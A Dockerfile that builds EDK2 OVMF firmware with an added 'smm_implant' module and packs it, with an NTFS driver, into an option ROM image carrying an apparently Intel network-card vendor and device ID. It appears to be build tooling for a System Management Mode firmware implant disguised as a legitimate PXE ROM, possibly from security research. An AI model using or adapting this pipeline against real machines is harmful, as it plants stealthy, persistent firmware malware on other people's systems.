FROM ubuntu:jammy

RUN apt update && apt upgrade -y && apt install git build-essential git uuid-dev iasl nasm python3 python3-distutils python3-apt python2 -y

RUN ln -s /bin/python3 /bin/python

WORKDIR /edk2

COPY smm_implant smm_implant/

RUN /bin/bash -c "source edksetup.sh && make -C BaseTools && sed -i -z 's/\[Components\]/\[Components\]\n  smm_implant\/smm_implant.inf/g' /edk2/OvmfPkg/OvmfPkgX64.dsc \
	&& build -a X64 -t GCC5 -b RELEASE -p OvmfPkg/OvmfPkgX64.dsc"

RUN BaseTools/Source/C/bin/EfiRom -f 0x8086 -i 0x15D7 -l 0x020000 -r 0x201 -v --debug 0 -o smm_implant.bin -e /ntfs_x64_rw.efi Build/OvmfX64/RELEASE_GCC5/X64/PXEOprom.efi

RUN tail -f /dev/null
